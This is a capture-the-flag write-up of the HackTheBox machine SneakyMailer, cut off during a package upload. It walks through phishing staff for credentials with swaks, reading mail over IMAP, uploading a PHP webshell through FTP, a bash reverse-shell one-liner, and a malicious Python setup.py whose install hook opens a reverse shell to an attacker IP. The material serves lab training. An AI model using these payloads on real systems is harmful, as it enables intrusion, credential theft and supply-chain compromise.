---
title: HTB: SneakyMailer
url: https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html
date: 2020-11-28T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-sneakymailer, ctf, hackthebox, nmap, wfuzz, vhosts, gobuster, phishing, swaks, htb-xen, imap, smtp, evolution, webshell, php, pypi, hashcat, htpasswd, setup-py, htb-chaos, htb-canape, sudo, pip, service, oscp-like-v2
---

![SneakyMailer](https://0xdfimages.gitlab.io/img/sneakymailer-cover.png)

SneakyMailer starts with web enumeration to find a list of email addresses, which I can use along with SMTP access to send phishing emails. One of the users will click on the link, and return a POST request with their login creds. That provides access to the IMAP inbox for that user, where I’ll find creds for FTP. The FTP access is in the web directory, and while there’s nothing interesting there, I can write a webshell and get execution, and a shell. To privesc, I’ll submit a malicious Python package to the local PyPi server, which provides execution and a shell as that user. For root, I’ll abuse a sudo rule to run pip, installing the same package again. In Beyond Root, I’ll look at the automation on the box running as services.

## Box Info

| Name | [SneakyMailer](https://hackthebox.com/machines/sneakymailer)  [SneakyMailer](https://hackthebox.com/machines/sneakymailer) [Play on HackTheBox](https://hackthebox.com/machines/sneakymailer) |
| --- | --- |
| Release Date | [11 Jul 2020](https://twitter.com/hackthebox_eu/status/1281229889979518976) |
| Retire Date | 28 Nov 2020 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for SneakyMailer |
| Radar Graph | Radar chart for SneakyMailer |
| First Blood User | 00:45:53[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 00:48:41[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creator | [sulcud sulcud](https://app.hackthebox.com/users/106709) |

## Recon

### nmap

`nmap` found seven open TCP ports, FTP (21), SSH (22), SMTP (25), HTTP (80, 8080), and IMAP (143, 993):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.197
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 15:04 EDT
Nmap scan report for 10.10.10.197
Host is up (0.015s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
143/tcp  open  imap
993/tcp  open  imaps
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 7.95 seconds
root@kali# nmap -sC -sV -p 21,22,25,80,143,993,8080 -oA scans/nmap-tcpscripts 10.10.10.197
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 15:05 EDT
Nmap scan report for 10.10.10.197
Host is up (0.013s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: CHILDREN IDLE QUOTA NAMESPACE UIDPLUS CAPABILITY ENABLE ACL2=UNION THREAD=ORDEREDSUBJECT completed OK STARTTLS ACL THREAD=REFERENCES UTF8=ACCEPTA0001 IMAP4rev1 SORT
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: CHILDREN IDLE QUOTA AUTH=PLAIN NAMESPACE UIDPLUS CAPABILITY ENABLE ACL2=UNION THREAD=ORDEREDSUBJECT OK completed ACL THREAD=REFERENCES UTF8=ACCEPTA0001 IMAP4rev1 SORT
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.36 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 10 buster. There’s also a redirect on port 80 to `http://sneakycorp.htb`

### FTP - TCP 21

`nmap` is usually pretty good about pointing out if anonymous login is allowed, but I tested just to be sure:

```

root@kali# ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:root): anonymous
530 Permission denied.
Login failed.
ftp>

```

Not only does it fail, it failed before asking for a password. Any other usernames I try also fail before password.

### VHost Brute

Given the redirect to a virtual host, I’ll scan for subdomains of that host, and find one:

```

root@kali# wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.197 -H "Host: FUZZ.sneakycorp.htb" --hh 185
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.197/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000022:   200        340 L    989 W    13737 Ch    "dev"

Total time: 152.5698
Processed Requests: 100000
Filtered Requests: 99999
Requests/sec.: 655.4373

```

I’ll add this line to `/etc/hosts` on my machine:

```
10.10.10.197 sneakycorp.htb dev.sneakycorp.htb

```

### sneakycorp.htb - TCP 80

#### Site

The page is some kind of dashboard for Sneaky Corp:

![image-20200712110823736](https://0xdfimages.gitlab.io/img/image-20200712110823736.png)

There are two projects:
- PyPI - 80% done, in testing. This is a Python packaging instance.
- POP3 and SMTP - Marked complete. I see these posts listening in `nmap` scans.

The Team link goes to `/team.php`, which presents a list of users and email addresses:

[![image-20200712111720032](https://0xdfimages.gitlab.io/img/image-20200712111720032.png)](https://0xdfimages.gitlab.io/img/image-20200712111720032.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200712111720032.png)

I’ll create a list of email addresses using `curl` , `grep`, and `cut`:

```

root@kali# curl -s http://sneakycorp.htb/team.php | grep '@' | cut -d'>' -f2 | cut -d'<' -f1 > emails

```

This produces a list of 57 emails:

```

root@kali# wc -l emails; head -5 emails 
57 emails
tigernixon@sneakymailer.htb
garrettwinters@sneakymailer.htb
ashtoncox@sneakymailer.htb
cedrickelly@sneakymailer.htb
airisatou@sneakymailer.htb

```

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://sneakycorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 20 -o scans/gobuster-sneakycorp.htb-med-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://sneakycorp.htb
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/11 15:40:49 Starting gobuster
===============================================================
/index.php (Status: 200)
/img (Status: 301)
/css (Status: 301)
/team.php (Status: 200)
/js (Status: 301)
/vendor (Status: 301)
/pypi (Status: 301)
===============================================================
2020/07/11 15:47:23 Finished
===============================================================

```

The only interesting thing that jumps out here is `/pypi`. This is certainly related to the note about PyPI from the page. Unfortunately, visiting `/pypi` just returns 403 Forbidden.

### dev.sneakycorp.htb - TCP 80

This site appears to be exactly the same:

![image-20200712112129070](https://0xdfimages.gitlab.io/img/image-20200712112129070.png)

### website - TCP 8080

Visiting TCP 8080 returns the default NGINX page:

![image-20200713064046492](https://0xdfimages.gitlab.io/img/image-20200713064046492.png)

I tried visiting by hostnames, and brute forcing directories, but didn’t find anything. I’ll have to come back to this later when I have more information.

## Shell as www-data

### Phish Creds

Given the theme of this box, it makes sense to use the list of emails to send a phish. I used `swaks` just like in [Endgame: Xen](/2020/06/17/endgame-xen.html#phishing-for-creds). I can include a list of recipients with the `--to` options, comma separated:

```

root@kali# swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
=== Trying 10.10.10.197:25...                 
=== Connected to 10.10.10.197.           
<-  220 debian ESMTP Postfix (Debian/GNU)    
 -> EHLO kali                                  
<-  250-debian                                   
<-  250-PIPELINING                            
<-  250-SIZE 10240000                            
<-  250-VRFY                                
<-  250-ETRN                               
<-  250-STARTTLS                          
<-  250-ENHANCEDSTATUSCODES               
<-  250-8BITMIME                              
<-  250-DSN                                 
<-  250-SMTPUTF8                                  
<-  250 CHUNKING                            
 -> MAIL FROM:<test@sneakymailer.htb>       
<-  250 2.1.0 Ok                            
 -> RCPT TO:<tigernixon@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> RCPT TO:<garrettwinters@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> RCPT TO:<ashtoncox@sneakymailer.htb>
<-  250 2.1.5 Ok
...[snip]...
 -> RCPT TO:<donnasnider@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Sun, 12 Jul 2020 10:55:55 -0400
 -> To: tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sne
akymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsi
lva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sn
eakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@snea
kymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothy
mooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zen
aidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.h
tb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb,
 -> From: test@sneakymailer.htb
 -> Subject: test
 -> Message-Id: <20200712105555.099308@kali>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> please click here http://10.10.14.42/
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 5143C24808
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

```

The body of my email is a link to myself. I’ll have Python’s `http.server` module listening. Strangely, a POST request comes back:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.197 - - [12/Jul/2020 10:51:01] code 501, message Unsupported method ('POST')
10.10.10.197 - - [12/Jul/2020 10:51:01] "POST / HTTP/1.1" 501 -

```

I stopped that and opened `nc` on port 80 to catch the request, and sent the phish again:

```

root@kali# nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:58924.
POST / HTTP/1.1
Host: 10.10.14.42
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt

```

It is posting creds for paulbyrd@sneakymailer.htb.

### IMAP Access

I’ll show both the manual way to access IMAP with `nc` as well as using a mail client.

#### Manual

With creds for Paul, I can check his email. I can interact with IMAP manually with `nc` on port 143 (or if I want to use the TLS version on port 993, I can use `ncat` (which is `nc` is aliased to on my machine) with the `--ssl` option). I showed this similar process in [Chaos](/2019/05/25/htb-chaos.html#imap).

IMAP commands each start with a tag. Most clients use A0001, but it can be anything. When the server responds, it will often reference the tag from the command that inspired it. I’ll start by logging in:

```

root@kali# nc 10.10.10.197 143
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for d
istribution information.
A0001 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
A0001 OK LOGIN Ok. 

```

Next, I’ll list the mailboxes:

```

A0002 LIST "" "*"
* LIST (\Unmarked \HasChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX.Trash"
* LIST (\HasNoChildren) "." "INBOX.Sent"
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
* LIST (\HasNoChildren) "." "INBOX.Sent Items"            
A0002 OK LIST completed

```

I can use the `SELECT` command to look at a mailbox, and that will return a summary of what’s in it. For example, `INBOX` is empty:

```

A0003 SELECT INBOX                   
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent) 
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
A0003 OK [READ-WRITE] Ok

```

The rest are empty too, except for `Inbox.Sent Items`, which reports two items:

```

A0007 SELECT "INBOX.Sent Items"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 2 EXISTS               
* 0 RECENT                                
* OK [UIDVALIDITY 589480766] Ok     
* OK [MYRIGHTS "acdilrsw"] ACL        
A0007 OK [READ-WRITE] Ok

```

To look at an item, I’ll use `FETCH # BODY.PEEK[]`. The first email is especially interesting:

```

A0008 FETCH 1 BODY.PEEK[]
* 1 FETCH (BODY[] {2167}
MIME-Version: 1.0
To: root <root@debian>
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
        boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"
--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"

Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it=20
--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
...[snip]...
A0008 OK FETCH completed.

```

The snipped data is just the HTML version of the same email. Since there are no message in the inbox, it’s likely that the administrator hasn’t changed those credentials yet.

The second sent email talks about testing the PyPI server:

```

A009 FETCH 2 BODY.PEEK[]
* 2 FETCH (BODY[] {585}
To: low@debian
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Module testing
Message-ID: <4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>
Date: Wed, 27 May 2020 13:28:58 -0400
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
 Thunderbird/68.8.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Content-Language: en-US

Hello low

Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.

)
A009 OK FETCH completed.

```

I’m not sure what to do with that yet.

#### Client

Instead of going manual, I could install Evolution mail client. I’ll install with `apt install evolution`, and then open it. I’ll close the wizard, and go to Edit -> Accounts, then Add -> Mail Account. In the window that opens, I’ll enter the email in the Identity window. In the next window, Receiving Email, I’ll add the IMAP server details. I can use TLS over 993 since that’s open on the server:

![image-20200712120008187](https://0xdfimages.gitlab.io/img/image-20200712120008187.png)

It requires a server for Sending Email, so I’ll give it SneakyMailer, even though I don’t plan to send email. I don’t recall seeing a TLS SMTP port, so I’ll set it to port 25, and set the encryption method to use TLS after connecting:

![image-20200712120206798](https://0xdfimages.gitlab.io/img/image-20200712120206798.png)

Clicking next through to the end, I’m not prompted for the password. On submitting `^(#J@SkFv2[%KhIxKk(Ju``hqcHl<:Ht`, the mailbox is there:

![image-20200712120328014](https://0xdfimages.gitlab.io/img/image-20200712120328014.png)

In Sent Items, I see the emails about the password:

![image-20200712120405595](https://0xdfimages.gitlab.io/img/image-20200712120405595.png)

### Shell

#### Enumeration / FTP Access

The cerds for the developer account don’t work on SSH, but they do work on FTP:

```

root@kali# ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:root): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

In here, there’s a `dev` directory:

```

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jul 12 11:52 dev
226 Directory send OK.

```

It contains the website as I’ve already enumerated:

```

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
226 Directory send OK.

```

I collected the three PHP files (`index.php`, `team.php`, and `pypi/register.php`). None of them actually have any dynamic content.

#### Upload Webshell

It does turn out that this account can write here. I’ll upload a simple webshell:

```

ftp> put /opt/shells/php/cmd.php 0xdf.php
local: /opt/shells/php/cmd.php remote: 0xdf.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
35 bytes sent in 0.00 secs (26.7656 kB/s)

```

I can trigger it and get execution:

```

root@kali# curl http://dev.sneakycorp.htb/0xdf.php --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

There is clearly a cron cleaning up the dev directory, as the webshell will be deleted quickly.

#### Shell

I’ll trigger the webshell to get an interactive shell:

```

root@kali# curl http://dev.sneakycorp.htb/0xdf.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.42/443 0>&1'"

```

`nc` gets a connection:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:54094.
bash: cannot set terminal process group (661): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade the shell with the [standard python pty stty method](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

## Priv: www-data –> low

### Enumeration

#### Identify Path

There are two users on the box, low and vmail:

```

www-data@sneakymailer:/home$ ls
low  vmail

```

www-data can’t access vmail, but can access low, where `user.txt` is, unreadable:

```

www-data@sneakymailer:/home/low$ ls -l
total 8
-rwxr-x--- 1 root low   33 Jul 12 16:48 user.txt
drwxr-xr-x 6 low  low 4096 May 16 03:33 venv

```

This is where the second email from Paul Byrd is useful. It tells low to download and run all the Python packages in their local pypi. Definitely a hint that I should put one in there.

#### PyPI

First I need to understand the PyPI config. In the process list, the pypi user is running `pypi-server`, a [minimal PyPI server](https://pypiserver.readthedocs.io/en/latest/README.html):

```

pypi       697  0.0  0.6  36956 25932 ?        Ss   Jul12   0:30 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages

```

The options give a lot of information about what’s going on here:
- `-i 127.0.0.1` - listening only on localhost
- `-p 5000` - port 5000
- `-a update,download,list` - list of actions that require authentication
- `-P /var/www/pypi.sneakycorp.htb/.htpasswd` - the password file, in Apache htpasswd format
- `--disable-fallback` - don’t redirect to the real PyPI if a package isn’t found
- `-o` - overwrite existing files
- `/var/www/pypi.sneakycorp.htb` - directory to put the packages in

#### Crack Password

I’ll grab the authentication hash:

```

www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd 
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/

```

I’ll toss that into `hashcat` after looking up the hash mode in the [list of example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes):

```

root@kali# hashcat -m 1600 pypi.hash /usr/share/wordlists/rockyou.txt --user --force
...[snip]...
$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui

```

#### NGINX

`netstat` shows that there is something listening on 127.0.0.1:5000, as identified from the `pypi-server` command line:

```

www-data@sneakymailer:/home/low$ netstat -tnlp4
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      744/nginx: worker p 
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      744/nginx: worker p 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -  

```

Looking in the NGINX configs shows that there are two active sites:

```

www-data@sneakymailer:/etc/nginx/sites-enabled$ ls 
pypi.sneakycorp.htb  sneakycorp.htb

```

`sneakycorp.htb` handles two virtual hosts and the redirect to `http://sneakycorp.htb` as a default server:

```

server {
        listen 0.0.0.0:80 default_server;
        listen [::]:80 default_server;
        return 301 http://sneakycorp.htb;
        server_name _;
}

server {
        listen 0.0.0.0:80;
        listen [::]:80;

        server_name sneakycorp.htb;

        root /var/www/sneakycorp.htb;
        index index.php;
        location / {
                try_files $uri $uri/ =404;
        }
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}

server {
        listen 0.0.0.0:80;
        listen [::]:80;

        server_name dev.sneakycorp.htb;

        root /var/www/dev.sneakycorp.htb/dev;
        index index.php;
        location / {
                try_files $uri $uri/ =404;
        }
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}

```

`pypi.sneakycorp.htb` defines one virtual host which matches it’s filename:

```

server {
        listen 0.0.0.0:8080 default_server;
        listen [::]:8080 default_server;
        server_name _;
}

server {
        listen 0.0.0.0:8080;
        listen [::]:8080;

        server_name pypi.sneakycorp.htb;

        location / {
                proxy_pass http://127.0.0.1:5000;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
        }
}

```

The default server doesn’t list a location, and this is what returns the default NGINX page. However, visiting `http://pypi.sneakycorp.htb:8080` will proxy through to localhost port 5000, where `pypi-server` is listening.

I’ll add this to my hosts file, and it works:

![image-20200713064300814](https://0xdfimages.gitlab.io/img/image-20200713064300814.png)

### Create Malicious Python Package

This [tutorial](https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/) includes the steps needed to upload a package to a local PyPI server.

#### Directory Structure

I’ll create a folder for my package, `revshell`, and create the following folder structure and files:

```

root@kali# tree revshell
revshell
├── README.md
├── revshell
│   └── __init__.py
├── setup.cfg
└── setup.py

1 directory, 4 files

```

`__init__.py` is where a legit application would actually start, and it must exist for the package to work. I’ll just use `touch` to create an empty file.

I’ll also create empty `setup.cfg` and `README.md` files. `README.md` should be the documentation for the package. `setup.cfg` should contain information about where the package metadata and `README.md` are located. I don’t need either, but it’s cleaner to include them even as empty files.

#### setup.py

The malicious code will go into `setup.py`. I’ve actually created a malicious `setup.py` before, back in [Canape](/2018/09/15/htb-canape.html#sudo-pip). The tutorial from Linode shows what a legit `setup.py` looks like. It basically calls `setup` with a bunch of metadata about the package. [This GitHub](https://github.com/mschwager/0wned) shows how to add the malicious part (albeit in the context of `sudo pip` as opposed to in a package, but it’s the same thing).

By default, `setup` has a handful of commands know by `pip` and `setup.py`, like `install`, `uninstall`, `list,` etc. I can use the `cmdclass` argument to `setup` to pass in a dictionary of commands with classes to use for them. The class should have a `run` method, and that will run. Because I’m expecting this interaction to happen immediately, I’ll just have the `run` function be a reverse shell:

```

import os
import socket
import subprocess
from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
    def run(self):
        RHOST = '10.10.14.42'
        RPORT = 443
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        for i in range(3):
            os.dup2(s.fileno(), i)
        p = subprocess.call(["/bin/sh","-i"])

setup(name='revshell',
      version='0.0.1',
      description='Reverse Shell',
      author='0xdf',
      author_email='0xdf',
      url='http://sneakycopy.htb',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': Exploit})

```

### Package and Upload

#### Local Package

To create a package, I can go into the `revshell` directory that contains `setup.py` and run it with the `sdist` command:

```

root@kali# python setup.py sdist
running sdist
running egg_info
writing revshell.egg-info/PKG-INFO
writing top-level names to revshell.egg-info/top_level.txt
writing dependency_links to revshell.egg-info/dependency_links.txt
reading manifest file 'revshell.egg-info/SOURCES.txt'
writing manifest file 'revshell.egg-info/SOURCES.txt'
running check
creating revshell-0.0.1
creating revshell-0.0.1/revshell.egg-info
copying files to revshell-0.0.1...
copying README.md -> revshell-0.0.1
copying setup.cfg -> revshell-0.0.1
copying setup.py -> revshell-0.0.1
copying revshell.egg-info/PKG-INFO -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/SOURCES.txt -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/dependency_links.txt -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/not-zip-safe -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/top_level.txt -> revshell-0.0.1/revshell.egg-info
Writing revshell-0.0.1/setup.cfg
Creating tar archive
removing 'revshell-0.0.1' (and everything under it)

```

There’s now an archive in the `dist` directory:

```

root@kali# ls -l dist/
total 4
-rwxrwx--- 1 root vboxsf 943 Jul 13 07:10 revshell-0.0.1.tar.gz

```

#### Remote PyPI

To package for a remote PyPI, I’ll create `~/.pypirc`, where I’ll define the server, including the authentication:

```

[distutils]
index-servers =
  sneaky
[sneaky]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui

```

Now I can run `setup.py` to upload to this server using the `upload` command. In fact, it’s required to create the package and upload it in the same run. If I just try to `upload`, it complains:

```

root@kali# python setup.py upload -r sneaky
running upload
error: Must create and upload files in one command (e.g. setup.py sdist upload)

```

But if I `sdist` and `upload`, it works:

```

root@kali# python setup.py sdist upload -r sneaky
running sdist
running egg_info
writing revshell.egg-info/PKG-INFO
writing top-level names to revshell.egg-info/top_level.txt
writing dependency_links to revshell.egg-info/dependency_links.txt
reading manifest file 'revshell.egg-info/SOURCES.txt'
writing manifest file 'revshell.egg-info/SOURCES.txt'
running check
creating revshell-0.0.1
creating revshell-0.0.1/revshell.egg-info
copying files to revshell-0.0.1...
copying README.md -> revshell-0.0.1
copying setup.cfg -> revshell-0.0.1
copying setup.py -> revshell-0.0.1
